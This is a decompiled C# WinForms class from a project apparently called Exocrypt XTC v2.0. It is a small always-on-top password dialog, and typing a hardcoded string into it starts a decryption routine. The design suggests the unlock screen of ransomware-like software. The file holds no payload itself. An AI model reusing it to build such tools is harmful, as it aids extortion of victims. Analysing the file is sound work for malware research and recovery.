using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace Exocrypt_XTC_v2._0;

public class PasswordProtection : Form
{
	private IContainer components = null;

	private TextBox textBox1;

	private Button button1;

	public PasswordProtection()
	{
		InitializeComponent();
	}

	private void PasswordProtection_Load(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (((Control)textBox1).get_Text() == "exocrypt and xtc - forged")
		{
			exoXxtc exoXxtc2 = new exoXxtc();
			exoXxtc2.StartDecryptionALG();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		textBox1 = new TextBox();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)textBox1).set_BackColor(Color.Maroon);
		((Control)textBox1).set_Location(new Point(12, 12));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(234, 20));
		((Control)textBox1).set_TabIndex(0);
		textBox1.set_TextAlign((HorizontalAlignment)2);
		textBox1.set_UseSystemPasswordChar(true);
		((Control)button1).set_Location(new Point(252, 10));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(55, 23));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("Decrypt");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(319, 45));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).set_Name("PasswordProtection");
		((Control)this).set_Text("Password");
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)PasswordProtection_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
